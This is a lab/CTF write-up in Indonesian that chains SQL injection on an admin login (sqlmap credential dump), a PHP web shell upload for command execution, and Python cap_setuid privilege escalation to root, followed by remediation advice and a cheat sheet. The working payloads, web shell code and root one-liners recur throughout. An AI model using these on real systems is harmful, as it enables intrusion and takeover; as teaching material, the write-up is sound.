# Write-Up Lengkap Lab Portrait
## SQL Injection → Credential Admin → Unrestricted File Upload → RCE `www-data` → Python Capability → Root

> **Ruang lingkup:** hanya untuk laboratorium, CTF, pembelajaran, atau pengujian yang memiliki izin tertulis.
>
> Dokumen ini menggabungkan versi **pembahasan detail** dan **close book** agar dapat digunakan untuk belajar konsep, mendokumentasikan evidence, sekaligus menjadi panduan cepat saat ujian.

---

## 1. Tujuan Pembelajaran

Setelah menyelesaikan lab ini, peserta diharapkan mampu:

1. melakukan reconnaissance terhadap aplikasi web;
2. mengidentifikasi parameter login yang rentan SQL Injection;
3. melakukan enumerasi database secara bertahap menggunakan SQLMap;
4. memperoleh credential administrator dari database;
5. mengeksploitasi fitur upload file hingga memperoleh command execution;
6. melakukan enumerasi Linux capability;
7. mengeksploitasi `cap_setuid` pada Python untuk memperoleh hak akses root; dan
8. menyusun evidence dan rekomendasi perbaikan secara sistematis.

---

## 2. Gambaran Besar Attack Chain

```text
Recon port 8080
→ temukan /administrator, /profile, dan /uploads
→ baseline request login
→ SQL Injection pada parameter username
→ cari current database
→ enumerasi tabel dan kolom
→ dump tabel users
→ dapat credential admin
→ login ke aplikasi
→ upload file PHP
→ akses file melalui /uploads
→ RCE sebagai www-data
→ enumerasi Linux capability
→ temukan python3.13 cap_setuid=ep
→ os.setuid(0)
→ command berjalan sebagai root
→ cari dan baca flag
```

### Ringkasan Hubungan Antarcelah

```text
SQL Injection
    ↓
Credential Administrator
    ↓
Unrestricted File Upload
    ↓
Remote Code Execution sebagai www-data
    ↓
Excessive Linux Capability pada Python
    ↓
Privilege Escalation menjadi root
```

---

## 3. Data Hafalan Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.118` |
| Web | `http://192.168.56.118:8080` |
| Login administrator | `/administrator` |
| Fitur upload | `/profile` |
| Direktori upload | `/uploads` |
| Database | `portrait` |
| Tabel credential | `users` |
| Credential | `admin:AdminPortr417126` |
| Web shell | `/uploads/cakgup.php` |
| User awal | `www-data` |
| Capability rentan | `/usr/bin/python3.13 cap_setuid=ep` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

Set variabel agar command berikutnya lebih mudah digunakan:

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

---

# BAGIAN A — PEMBAHASAN DETAIL

## 4. Fase 1 — Reconnaissance Service

### Tujuan

Menentukan service yang berjalan pada port aplikasi dan memperoleh informasi awal teknologi target.

### Command

```bash
nmap -Pn -sC -sV -p8080 "$TARGET"
```

### Output yang Diharapkan

```text
8080/tcp open  http
```

### Interpretasi

Port `8080` terbuka dan melayani aplikasi web. Selanjutnya lakukan enumerasi direktori untuk menemukan endpoint yang tidak terlihat langsung dari halaman utama.

---

## 5. Fase 2 — Enumerasi Direktori

### Command

```bash
dirsearch -u "$WEB" -e php,html,txt
```

Alternatif apabila `dirsearch` tidak tersedia:

```bash
feroxbuster -u "$WEB" -x php,html,txt
```

### Temuan Utama

```text
/administrator
/profile
/uploads
```

### Fungsi Endpoint

| Endpoint | Fungsi yang Diperkirakan |
|---|---|
| `/administrator` | Login administrator dan titik uji SQL Injection |
| `/profile` | Pengelolaan profil dan upload avatar/file |
| `/uploads` | Lokasi file hasil upload disajikan oleh web server |

> Temuan direktori belum membuktikan kerentanan. Setiap endpoint harus diuji secara manual dan didokumentasikan.

---

## 6. Fase 3 — Baseline Request Login

### Tujuan

Mengetahui method, nama parameter, cookie, dan pola respons login sebelum melakukan pengujian SQL Injection.

### Kirim Login Salah

```bash
curl -sS \
  -D login-failed.headers \
  -o login-failed.html \
  -c login.cookies \
  -X POST "$WEB/administrator/" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=InvalidPassword123!"
```

### Periksa Respons

```bash
cat login-failed.headers

grep -Ein \
  'invalid|incorrect|failed|error|username|password|dashboard|logout' \
  login-failed.html

wc -c login-failed.html
```

### Output Contoh

```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...
```

### Informasi yang Diperoleh

- endpoint login menerima request `POST`;
- parameter login bernama `username` dan `password`;
- aplikasi menggunakan session cookie;
- request dapat direplikasi dengan `curl`, Burp Repeater, atau SQLMap;
- respons login gagal menjadi pembanding saat menguji payload.

---

## 7. Fase 4 — Uji SQL Injection Manual

### Payload Dasar

```text
' OR '1'='1
```

Alternatif:

```text
admin'-- -
```

### Contoh dengan `curl`

```bash
curl -sS \
  -X POST "$LOGIN_URL" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=test" \
  -D sqli-test.headers \
  -o sqli-test.html
```

Bandingkan respons dengan login gagal:

```bash
grep -Ein 'dashboard|logout|welcome|admin|invalid|failed' sqli-test.html
wc -c login-failed.html sqli-test.html
```

### Konsep Kerentanan

Aplikasi kemungkinan menyusun query dengan menggabungkan input pengguna secara langsung, misalnya:

```sql
SELECT * FROM users
WHERE username = '$username'
  AND password = '$password';
```

Payload dapat mengubah logika query menjadi kondisi yang selalu benar atau mengomentari bagian query setelah input.

> Uji manual berguna untuk memahami perilaku aplikasi. SQLMap kemudian dipakai agar enumerasi database lebih konsisten dan evidence lebih mudah ditelusuri.

---

## 8. Fase 5 — SQLMap: Konfirmasi dan Cari Current Database

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

### Parameter Penting

| Parameter | Fungsi |
|---|---|
| `-u` | URL endpoint target |
| `--data` | Data request POST |
| `-p username` | Hanya menguji parameter `username` |
| `--batch` | Menggunakan jawaban default tanpa prompt interaktif |
| `--current-db` | Menampilkan database aktif |

### Evidence

```text
current database: 'portrait'
```

### Interpretasi

Nama database `portrait` diketahui dari proses enumerasi, bukan ditebak. Tahap ini penting dalam write-up agar alur penemuan dapat direproduksi.

---

## 9. Fase 6 — SQLMap: Enumerasi Tabel

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables
```

### Evidence

```text
Database: portrait
[...]
users
```

### Interpretasi

Tabel `users` menjadi kandidat utama karena kemungkinan menyimpan informasi akun dan credential aplikasi.

---

## 10. Fase 7 — SQLMap: Enumerasi Kolom

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --columns
```

### Output Contoh

```text
Database: portrait
Table: users
[...]
username
password
```

### Interpretasi

Tahap ini menjelaskan alasan pemilihan kolom credential. Saat ujian cepat, `--dump` dapat dilakukan langsung setelah menemukan tabel, tetapi dalam laporan pembelajaran sebaiknya alur enumerasi ditampilkan lengkap.

---

## 11. Fase 8 — SQLMap: Dump Credential Administrator

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

### Evidence

```text
Username : admin
Password : AdminPortr417126
```

### Hasil

```text
admin:AdminPortr417126
```

### Makna Temuan

SQL Injection tidak hanya memungkinkan bypass login, tetapi juga membaca isi database dan memperoleh credential administrator yang valid.

---

## 12. Fase 9 — Login Administrator

Akses:

```text
http://192.168.56.118:8080/administrator
```

Credential:

```text
Username : admin
Password : AdminPortr417126
```

Setelah login, buka:

```text
http://192.168.56.118:8080/profile
```

Cari fitur upload avatar atau upload file.

---

## 13. Fase 10 — Membuat PHP Command Runner

### Buat File

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

### Cara Kerja

Kode PHP membaca parameter `cmd`, lalu menjalankannya melalui fungsi `system()`.

Contoh request:

```text
/uploads/cakgup.php?cmd=id
```

Setara dengan menjalankan:

```bash
id
```

pada server target.

---

## 14. Fase 11 — Upload Web Shell

Upload `cakgup.php` melalui fitur pada `/profile`.

### Hal yang Perlu Diamati

- apakah aplikasi memeriksa ekstensi file;
- apakah aplikasi hanya memeriksa nilai `Content-Type`;
- apakah nama file diubah oleh server;
- apakah file disimpan di `/uploads`;
- apakah direktori upload mengeksekusi PHP;
- apakah URL file ditampilkan setelah upload.

### Jika Aplikasi Hanya Memeriksa MIME

Gunakan Burp Suite untuk mengubah bagian multipart seperti berikut:

```http
Content-Disposition: form-data; name="file"; filename="cakgup.php"
Content-Type: image/jpeg
```

Isi file tetap:

```php
<?php system($_GET['cmd']); ?>
```

> Perubahan MIME hanya relevan apabila validasi aplikasi memang bergantung pada header tersebut. Jangan mengasumsikan satu bypass berlaku pada semua aplikasi.

---

## 15. Fase 12 — Validasi Remote Code Execution

### Set URL Shell

```bash
SHELL_URL="$WEB/uploads/cakgup.php"
```

### Jalankan Command Dasar

```bash
curl -sG \
  --data-urlencode "cmd=id; whoami; hostname; pwd" \
  "$SHELL_URL"
```

### Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

### Interpretasi

- file berhasil di-upload;
- file dapat diakses dari web;
- server mengeksekusi file sebagai PHP;
- input `cmd` diteruskan ke sistem operasi;
- command berjalan dengan user web server `www-data`.

Dengan demikian, temuan telah meningkat dari **unrestricted file upload** menjadi **remote code execution**.

---

## 16. Fase 13 — Enumerasi Sistem sebagai `www-data`

### Identitas dan Sistem

```bash
curl -sG \
  --data-urlencode "cmd=id; whoami; uname -a; cat /etc/os-release" \
  "$SHELL_URL"
```

### Cari Binary SUID

```bash
curl -sG \
  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null" \
  "$SHELL_URL"
```

### Cari Linux Capability

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
  "$SHELL_URL"
```

### Evidence Utama

```text
/usr/bin/python3.13 cap_setuid=ep
```

---

## 17. Memahami `cap_setuid=ep`

Linux capability memecah hak istimewa root menjadi kemampuan yang lebih spesifik.

```text
cap_setuid
```

memberikan proses kemampuan untuk mengubah UID.

Penanda:

```text
ep
```

berarti capability tersedia pada set **effective** dan **permitted**. Karena Python dapat menjalankan kode arbitrer, capability ini memungkinkan pemanggilan:

```python
os.setuid(0)
```

UID `0` adalah user `root`.

### Mengapa Ini Berbahaya?

Binary interpreter umum seperti Python dapat menjalankan hampir semua fungsi sistem. Memberikan `cap_setuid` pada Python secara praktis memungkinkan user yang dapat menjalankannya untuk memperoleh akses root.

---

## 18. Fase 14 — Privilege Escalation ke Root

### Proof of Concept

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  "$SHELL_URL"
```

### Evidence yang Diharapkan

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
root
```

> Pada beberapa sistem, group tetap menunjukkan group proses awal. Yang menentukan keberhasilan eskalasi adalah UID/effective UID menjadi `0` dan command dapat mengakses resource root.

---

## 19. Fase 15 — Mencari Flag

Jangan menebak nama atau lokasi flag. Cari terlebih dahulu:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

### Output Contoh

```text
/root/flag.txt
```

Catat path yang benar sesuai output lab.

---

## 20. Fase 16 — Membaca Flag

Ganti `/PATH/FLAG` dengan path dari hasil `find`:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

Contoh jika flag berada di `/root/flag.txt`:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; cat /root/flag.txt\")'" \
  "$SHELL_URL"
```

---

# BAGIAN B — ANALISIS TEMUAN

## 21. Temuan 1 — SQL Injection pada Login Administrator

### Judul yang Disarankan

```text
SQL Injection pada Parameter username di Endpoint /administrator
Memungkinkan Pembacaan Database dan Pengambilalihan Akun Administrator
```

### Akar Masalah

- input pengguna digabung langsung ke query SQL;
- aplikasi tidak menggunakan parameterized query/prepared statement;
- validasi input tidak memisahkan data dan perintah SQL;
- error atau perbedaan respons cukup untuk mendukung enumerasi.

### Dampak

- bypass autentikasi;
- pembacaan tabel dan data sensitif;
- pencurian credential;
- manipulasi atau penghapusan data;
- menjadi tahap awal pengambilalihan server melalui chained exploit.

### Rekomendasi

1. gunakan prepared statement atau parameterized query;
2. jangan menyusun query dengan string concatenation;
3. batasi privilege akun database aplikasi;
4. jangan menyimpan password dalam plaintext;
5. gunakan password hashing adaptif seperti Argon2id atau bcrypt;
6. samakan respons login gagal untuk mengurangi informasi tambahan;
7. tambahkan logging dan alert untuk pola injeksi;
8. lakukan code review dan pengujian SAST/DAST pada pipeline pengembangan.

---

## 22. Temuan 2 — Unrestricted File Upload Menjadi RCE

### Judul yang Disarankan

```text
Unrestricted File Upload pada Fitur Profile Memungkinkan Eksekusi
Kode PHP sebagai User www-data
```

### Akar Masalah

- aplikasi menerima file berdasarkan input pengguna tanpa validasi kuat;
- validasi hanya mengandalkan ekstensi atau MIME yang dapat dimanipulasi;
- file disimpan dalam web root;
- direktori upload mengizinkan eksekusi script;
- nama file dan lokasi penyimpanan dapat diprediksi atau diakses langsung.

### Dampak

- remote command execution;
- pembacaan file aplikasi dan konfigurasi;
- pencurian credential database;
- modifikasi atau penghapusan data;
- pivot ke jaringan internal;
- privilege escalation jika terdapat miskonfigurasi host.

### Rekomendasi

1. gunakan allowlist ekstensi yang benar-benar diperlukan;
2. verifikasi MIME menggunakan isi file, bukan hanya header request;
3. validasi magic bytes dan lakukan decoding/re-encoding untuk gambar;
4. simpan file di luar web root;
5. ubah nama file menjadi nilai acak yang dibuat server;
6. nonaktifkan eksekusi script pada direktori upload;
7. sajikan file melalui endpoint download terkontrol;
8. terapkan batas ukuran dan scanning malware;
9. jalankan web server dengan privilege minimum;
10. tolak ekstensi ganda, karakter khusus, dan format ambigu.

---

## 23. Temuan 3 — Python Memiliki `cap_setuid=ep`

### Judul yang Disarankan

```text
Excessive Linux Capability pada /usr/bin/python3.13 Memungkinkan
Privilege Escalation dari www-data menjadi root
```

### Akar Masalah

Interpreter Python diberikan capability `cap_setuid`, padahal binary tersebut dapat menjalankan kode arbitrer.

### Dampak

- user lokal atau proses aplikasi dapat memperoleh UID root;
- seluruh confidentiality, integrity, dan availability server terancam;
- penyerang dapat membaca file root, mengubah konfigurasi, membuat persistence, atau mengambil alih sistem.

### Rekomendasi

Hapus capability yang tidak diperlukan:

```bash
sudo setcap -r /usr/bin/python3.13
```

Verifikasi:

```bash
getcap /usr/bin/python3.13
```

Tambahan pengamanan:

- audit capability secara berkala dengan `getcap -r /`;
- gunakan prinsip least privilege;
- hindari capability berbahaya pada interpreter, shell, editor, atau utility serbaguna;
- pantau perubahan capability melalui file integrity monitoring;
- batasi user web server dengan AppArmor/SELinux atau sandbox yang sesuai.

---

## 24. Ringkasan Risiko Chained Exploit

Masing-masing celah sudah berbahaya, tetapi kombinasi ketiganya menghasilkan kompromi penuh:

| Tahap | Celah | Hasil |
|---|---|---|
| 1 | SQL Injection | Credential administrator diperoleh |
| 2 | File upload tidak aman | RCE sebagai `www-data` |
| 3 | Python `cap_setuid` | Root compromise |

### Dampak Akhir

```text
Unauthenticated attacker
→ administrator aplikasi
→ command execution
→ root operating system
```

Severity keseluruhan layak dinilai **Critical** karena eksploitasi berujung pada pengambilalihan penuh server.

---

# BAGIAN C — EVIDENCE DAN TROUBLESHOOTING

## 25. Checklist Evidence

Simpan bukti berikut untuk write-up atau laporan:

- [ ] hasil Nmap yang menunjukkan port `8080`;
- [ ] hasil directory enumeration;
- [ ] request dan respons baseline login gagal;
- [ ] parameter `username` yang terkonfirmasi rentan;
- [ ] output SQLMap `--current-db`;
- [ ] output SQLMap `--tables`;
- [ ] output SQLMap `--columns`;
- [ ] hasil dump credential;
- [ ] screenshot login administrator;
- [ ] request upload file dan respons server;
- [ ] URL file hasil upload;
- [ ] output `id`, `whoami`, dan `hostname` sebagai `www-data`;
- [ ] output `getcap -r /` yang menunjukkan `cap_setuid=ep`;
- [ ] output `id` dan `whoami` setelah `os.setuid(0)`;
- [ ] hasil pencarian dan pembacaan flag.

---

## 26. Troubleshooting

| Masalah | Kemungkinan Penyebab | Solusi |
|---|---|---|
| SQLMap tidak menemukan injeksi | Endpoint atau data POST salah | Tangkap request asli dengan Burp dan pastikan parameter benar |
| SQLMap memakai hasil cache lama | Session SQLMap sebelumnya | Tambahkan `--flush-session` |
| Redirect mengganggu SQLMap | Endpoint mengalihkan request | Periksa slash pada URL dan respons Burp/curl |
| Tidak tahu nama database | Tahap discovery dilewati | Jalankan `--current-db` |
| Tidak tahu tabel | Belum menjalankan enumerasi | Gunakan `-D portrait --tables` |
| Tidak tahu kolom | Belum menjalankan `--columns` | Gunakan `-T users --columns` |
| Login admin gagal | Credential salah atau cookie lama | Coba private browser dan pastikan credential tepat |
| File upload ditolak | Filter ekstensi/MIME | Periksa request multipart dan validasi aktual aplikasi |
| Web shell `404` | Nama file atau lokasi berubah | Periksa respons upload, source HTML, atau listing `/uploads` |
| PHP tampil sebagai teks | Direktori tidak mengeksekusi PHP | Cari lokasi penyimpanan lain; jangan klaim RCE sebelum terbukti |
| `system()` tidak menghasilkan output | Fungsi dinonaktifkan | Periksa `disable_functions`; uji fungsi yang masih tersedia dalam lab |
| `getcap` tidak ditemukan | Paket capability tidak tersedia/PATH berbeda | Coba `/usr/sbin/getcap` atau cari binary dengan `which getcap` |
| Python path berbeda | Versi sistem berbeda | Jalankan `getcap -r / 2>/dev/null | grep -i python` |
| `os.setuid(0)` gagal | Capability tidak aktif atau binary berbeda | Pastikan path sesuai output `getcap` |
| Flag tidak ditemukan | Nama flag berbeda | Gunakan pencarian case-insensitive dan perluas pola seperlunya |

### SQLMap dengan Session Baru

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --flush-session \
  --current-db
```

---

# BAGIAN D — CLOSE BOOK

## 27. Alur Hafalan

```text
nmap 8080
→ dirsearch
→ /administrator /profile /uploads
→ baseline login POST username/password
→ sqlmap --current-db
→ portrait
→ sqlmap --tables
→ users
→ sqlmap --columns
→ username/password
→ sqlmap --dump
→ admin:AdminPortr417126
→ login admin
→ upload cakgup.php
→ /uploads/cakgup.php?cmd=id
→ www-data
→ getcap -r /
→ python3.13 cap_setuid=ep
→ os.setuid(0)
→ root
→ find flag
→ cat flag
```

---

## 28. Close Book — Langkah Singkat

### 28.1 Set Target

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

### 28.2 Enumerasi dan Dump Credential

```bash
sqlmap -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db

sqlmap -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables

sqlmap -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Expected:

```text
admin
AdminPortr417126
```

### 28.3 Buat Web Shell

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Login ke `/administrator`, buka `/profile`, kemudian upload `cakgup.php`.

### 28.4 Validasi RCE

```bash
SHELL_URL="$WEB/uploads/cakgup.php"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname" \
  "$SHELL_URL"
```

Expected:

```text
uid=33(www-data)
www-data
```

### 28.5 Cari Capability

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null | grep -i python" \
  "$SHELL_URL"
```

Expected:

```text
/usr/bin/python3.13 cap_setuid=ep
```

### 28.6 Root dan Cari Flag

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; id; find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

### 28.7 Baca Flag

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

---

## 29. Cheat Sheet Paling Pendek

```bash
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'

# Credential
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch \
  -D portrait -T users --dump

# Web shell
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
# Login admin:AdminPortr417126 → /profile → upload cakgup.php

# RCE
SHELL_URL="$WEB/uploads/cakgup.php"
curl -sG --data-urlencode "cmd=id;whoami;hostname" "$SHELL_URL"

# Cari capability
curl -sG --data-urlencode \
  "cmd=getcap -r / 2>/dev/null | grep -i python" \
  "$SHELL_URL"

# Root + cari flag
curl -sG --data-urlencode \
  "cmd=/usr/bin/python3.13 -c 'import os;os.setuid(0);os.system(\"whoami;id;find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"

# Baca flag
curl -sG --data-urlencode \
  "cmd=/usr/bin/python3.13 -c 'import os;os.setuid(0);os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

---

## 30. Ringkasan Satu Paragraf

Target pada port `8080` memiliki SQL Injection pada parameter `username` di login administrator. Kerentanan tersebut digunakan untuk mengidentifikasi database `portrait`, menemukan tabel `users`, dan memperoleh credential `admin:AdminPortr417126`. Setelah login, fitur profile menerima file PHP yang kemudian dapat diakses melalui direktori `/uploads`, sehingga penyerang memperoleh remote command execution sebagai `www-data`. Enumerasi lokal menemukan `/usr/bin/python3.13` memiliki capability `cap_setuid=ep`. Dengan menjalankan `os.setuid(0)`, proses Python memperoleh UID root, sehingga penyerang dapat mengakses seluruh sistem dan membaca flag yang berada di area terproteksi.

---

## 31. Formula Hafalan

```text
R.S.U.C.R

R = Recon
S = SQL Injection
U = Upload PHP
C = Capability Python
R = Root
```

